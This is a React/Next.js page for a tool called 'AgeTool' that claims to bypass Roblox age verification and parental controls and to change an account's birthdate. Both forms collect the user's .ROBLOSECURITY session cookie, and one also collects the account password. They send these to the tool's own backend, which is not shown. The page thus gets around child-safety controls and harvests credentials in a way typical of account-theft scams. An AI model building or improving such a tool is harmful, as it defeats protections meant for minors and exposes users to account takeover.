'use client'

import { useState } from 'react'

export default function Page() {
  const [activeTab, setActiveTab] = useState('bypass')
  const [cookie, setCookie] = useState('')
  const [password, setPassword] = useState('')
  const [year, setYear] = useState('2016')
  const [loading, setLoading] = useState(false)
  const [message, setMessage] = useState('')
  const [messageType, setMessageType] = useState('')

  const handleBypass = async (e: React.FormEvent) => {
    e.preventDefault()
    setLoading(true)
    setMessage('')

    try {
      const response = await fetch('/api/bypass', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ cookie, password })
      })

      const data = await response.json()

      if (response.ok) {
        setMessageType('success')
        setMessage(`✓ ${data.message} - User ID: ${data.userId}`)
        setCookie('')
        setPassword('')
      } else {
        setMessageType('error')
        setMessage(`✗ ${data.error || 'Failed to bypass'}`)
      }
    } catch (error) {
      setMessageType('error')
      setMessage('✗ Error during bypass: ' + (error instanceof Error ? error.message : 'Unknown error'))
    } finally {
      setLoading(false)
    }
  }

  const handleSetBirthdate = async (e: React.FormEvent) => {
    e.preventDefault()
    setLoading(true)
    setMessage('')

    try {
      const response = await fetch('/api/set-birthdate', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ cookie, year: parseInt(year) })
      })

      const data = await response.json()

      if (response.ok) {
        setMessageType('success')
        setMessage(`✓ ${data.message} - New Birthdate: ${data.newBirthdate}`)
        setCookie('')
      } else {
        setMessageType('error')
        setMessage(`✗ ${data.error || 'Failed to change birthdate'}`)
      }
    } catch (error) {
      setMessageType('error')
      setMessage('✗ Error: ' + (error instanceof Error ? error.message : 'Unknown error'))
    } finally {
      setLoading(false)
    }
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 to-slate-800 text-white p-4">
      <div className="max-w-md mx-auto mt-10">
        <div className="bg-slate-800 rounded-lg shadow-2xl p-6 border border-slate-700">
          <h1 className="text-3xl font-bold mb-2 text-center">AgeTool</h1>
          <p className="text-slate-400 text-center mb-6">Bypass age verification & change birthdate</p>

          {/* Tabs */}
          <div className="flex gap-2 mb-6 border-b border-slate-700">
            <button
              onClick={() => setActiveTab('bypass')}
              className={`px-4 py-2 font-semibold transition-all ${
                activeTab === 'bypass'
                  ? 'text-blue-400 border-b-2 border-blue-400'
                  : 'text-slate-400 hover:text-slate-300'
              }`}
            >
              Method 1: Parental Controls
            </button>
            <button
              onClick={() => setActiveTab('birthdate')}
              className={`px-4 py-2 font-semibold transition-all ${
                activeTab === 'birthdate'
                  ? 'text-green-400 border-b-2 border-green-400'
                  : 'text-slate-400 hover:text-slate-300'
              }`}
            >
              Method 2: Manual Birthdate
            </button>
          </div>

          {/* Method 1: Parental Controls Bypass */}
          {activeTab === 'bypass' && (
            <form onSubmit={handleBypass} className="space-y-4">
              <p className="text-sm text-slate-400 mb-4">
                Bypass age verification through parental controls. Requires your account cookie.
              </p>
              <div>
                <label className="block text-sm font-semibold mb-2">Roblox Cookie (.ROBLOSECURITY)</label>
                <input
                  type="password"
                  value={cookie}
                  onChange={(e) => setCookie(e.target.value)}
                  placeholder="Paste your .ROBLOSECURITY cookie"
                  className="w-full px-4 py-2 bg-slate-700 border border-slate-600 rounded-lg focus:outline-none focus:border-blue-400 text-white placeholder-slate-500"
                  required
                />
              </div>
              <div>
                <label className="block text-sm font-semibold mb-2">Account Password</label>
                <input
                  type="password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  placeholder="Your Roblox password"
                  className="w-full px-4 py-2 bg-slate-700 border border-slate-600 rounded-lg focus:outline-none focus:border-blue-400 text-white placeholder-slate-500"
                  required
                />
              </div>
              <button
                type="submit"
                disabled={loading}
                className="w-full bg-blue-600 hover:bg-blue-700 disabled:bg-slate-600 text-white font-bold py-2 rounded-lg transition-colors"
              >
                {loading ? 'Processing...' : 'Bypass via Parental Controls'}
              </button>
            </form>
          )}

          {/* Method 2: Manual Birthdate Change */}
          {activeTab === 'birthdate' && (
            <form onSubmit={handleSetBirthdate} className="space-y-4">
              <p className="text-sm text-slate-400 mb-4">
                Directly change your account birthdate. No verification needed.
              </p>
              <div>
                <label className="block text-sm font-semibold mb-2">Roblox Cookie (.ROBLOSECURITY)</label>
                <input
                  type="password"
                  value={cookie}
                  onChange={(e) => setCookie(e.target.value)}
                  placeholder="Paste your .ROBLOSECURITY cookie"
                  className="w-full px-4 py-2 bg-slate-700 border border-slate-600 rounded-lg focus:outline-none focus:border-blue-400 text-white placeholder-slate-500"
                  required
                />
              </div>
              <div>
                <label className="block text-sm font-semibold mb-2">Birth Year</label>
                <input
                  type="number"
                  value={year}
                  onChange={(e) => setYear(e.target.value)}
                  min="1900"
                  max={new Date().getFullYear()}
                  className="w-full px-4 py-2 bg-slate-700 border border-slate-600 rounded-lg focus:outline-none focus:border-blue-400 text-white"
                />
              </div>
              <button
                type="submit"
                disabled={loading}
                className="w-full bg-green-600 hover:bg-green-700 disabled:bg-slate-600 text-white font-bold py-2 rounded-lg transition-colors"
              >
                {loading ? 'Processing...' : `Change Birthdate to ${year}`}
              </button>
            </form>
          )}

          {/* Message */}
          {message && (
            <div
              className={`mt-6 p-4 rounded-lg text-center font-semibold ${
                messageType === 'success'
                  ? 'bg-green-900 text-green-200 border border-green-700'
                  : 'bg-red-900 text-red-200 border border-red-700'
              }`}
            >
              {message}
            </div>
          )}
        </div>
      </div>
    </div>
  )
}
